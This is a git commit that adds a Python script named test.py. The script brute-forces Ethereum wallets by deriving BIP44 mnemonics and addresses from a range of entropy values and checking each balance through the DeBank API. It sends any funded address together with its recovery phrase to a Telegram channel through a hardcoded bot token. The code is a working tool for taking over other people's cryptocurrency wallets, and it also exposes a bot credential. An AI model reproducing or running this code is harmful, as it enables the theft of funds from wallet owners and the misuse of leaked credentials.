187b580ea2c4bde82e8c9b8bb80edb00f9fe9813
lomaster11 <102434876+lomaster11@users.noreply.github.com>
2022-05-04 04:36:11 +0500

    Add files via upload

---
+++ test.py
@@ -0,0 +1,48 @@
+import requests
+from hdwallet import BIP44HDWallet
+from hdwallet.cryptocurrencies import EthereumMainnet
+from hdwallet.derivations import BIP44Derivation
+from typing import Optional
+
+class telegram:
+    token = '5237275928:AAE_v3LMCBoNJSO-zeQPYBrqjOWxPGpaMvk'
+    channel_id = '@maxgood11'
+def send_telegram(text: str):
+    try:
+        requests.get('https://api.telegram.org/bot{}/sendMessage'.format(telegram.token), params=dict(
+        chat_id=telegram.channel_id,
+        text=text))
+        print ("Send to telegram")
+    except:
+        print(f'Error send telegram.')
+send_telegram("Начал Домашний комп")
+
+start_str = input('Start of range: ')
+end_str = input('End of range: ')
+
+start = int(start_str, 16)
+end = int(end_str, 16)
+
+for i in range(start, end+1):
+        #f.write('{:064X}\n'.format(i))
+        #print('{:032x}\n'.format(i)) # SMALL CHARACTERS 
+
+    ENTROPY: str = ('{:032x}'.format(i))
+    PASSPHRASE: Optional[str] = None
+    bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=EthereumMainnet)
+    bip44_hdwallet.from_entropy(
+    entropy=ENTROPY, language="english", passphrase=PASSPHRASE)
+    bip44_hdwallet.clean_derivation()
+    address_index = 0
+    bip44_derivation: BIP44Derivation = BIP44Derivation(
+    cryptocurrency=EthereumMainnet, account=0, change=False, address=address_index)
+    bip44_hdwallet.from_path(path=bip44_derivation)
+    addr = bip44_hdwallet.address()
+    mnemonic = bip44_hdwallet.mnemonic()
+    print(mnemonic)
+    print(addr)
+    json_bal = requests.get(f"https://openapi.debank.com/v1/user/total_balance?id={addr}").json()
+    print(f"Balance: {json_bal['total_usd_value']}")
+    if float(json_bal['total_usd_value'])  > 0.0:
+        text = (f"Address: {addr}\nMnemonic: {mnemonic}\nBalance: {json_bal['total_usd_value']}\n")
+        send_telegram(text)
